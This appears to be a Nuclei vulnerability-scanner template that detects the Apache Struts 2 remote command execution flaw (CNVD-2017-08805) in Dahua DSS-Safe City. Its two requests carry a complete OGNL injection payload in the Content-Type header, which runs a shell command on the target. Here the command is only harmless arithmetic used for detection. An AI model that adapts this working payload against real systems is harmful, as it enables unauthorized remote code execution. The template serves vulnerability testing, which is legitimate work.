id: dahua-dss-rce-cnvd-2017-08805
info:
  name: Dahua DSS RCE (CNVD-2017-08805)
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Dahua DSS-Safe City uses Apache Struts 2 which has a remote command execution vulnerability. Exploiting the vulnerability allows attackers to execute arbitrary system commands via crafted Content-Type headers.
  reference:
    - http://www.cnvd.org.cn/flaw/show/CNVD-2017-08805
  tags: rce

variables:
  maxNumber: "{{rand_int(1000000, 9999999)}}"
  minNumber: "{{rand_int(10000, 99999)}}"
  sumNumber: "{{to_number(maxNumber) + to_number(minNumber)}}"

http:
  - raw:
      - |
        POST /portal/login_init.action HTTP/1.1
        Host: {{Hostname}}
        Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='expr {{maxNumber}} + {{minNumber}}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{sumNumber}}"
        part: body
  - raw:
      - |
        POST /admin/login_login.action HTTP/1.1
        Host: {{Hostname}}
        Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='expr {{maxNumber}} + {{minNumber}}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{sumNumber}}"
        part: body
